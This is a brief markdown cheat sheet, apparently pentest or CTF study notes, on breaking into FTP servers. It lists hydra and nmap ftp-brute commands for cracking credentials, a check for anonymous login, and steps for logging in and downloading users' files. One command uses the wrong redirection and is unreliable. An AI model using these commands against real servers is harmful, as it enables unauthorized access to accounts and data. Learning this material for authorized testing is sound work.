# FTP

## Get username and passwords list using HYDRA
* `hydra -L [username_file.txt] -P [password_file.txt] [IP] [protocol_name, in this case=ftp]`


## Get password of a specific user (username required) 
* `echo "[username]" < [any valid variable_name to store the value]`
* check by: `cat[variable_name]`
* `nmap --script ftp-brute --script-args userdb=/root/[variable_name] -p 21 [IP]`

## Get into FTP as an anonymous user
* To check whether the ftp server on the target system allows anonymous login or not, use this:
  * `nmap --script ftp-anon -p 21 [IP]`
  * If it returns the message: "Anonymous FTP login allowed" ---> `ftp [IP]` ---> Put user as `anonymous` and press enter when asked for the password --> you will be in the FTP server.

***

**Get into the files shared by a user**
* Then `ftp [IP]` ---> it will ask for username and password which can be entered from the list fetched from hydra command.
* Once we are in, see the files: `ls` ---> `get [file_name]` ---> `bye`
* Once exit, we can see [file_name] on our local system which can be fetched using `cat [file_name]`
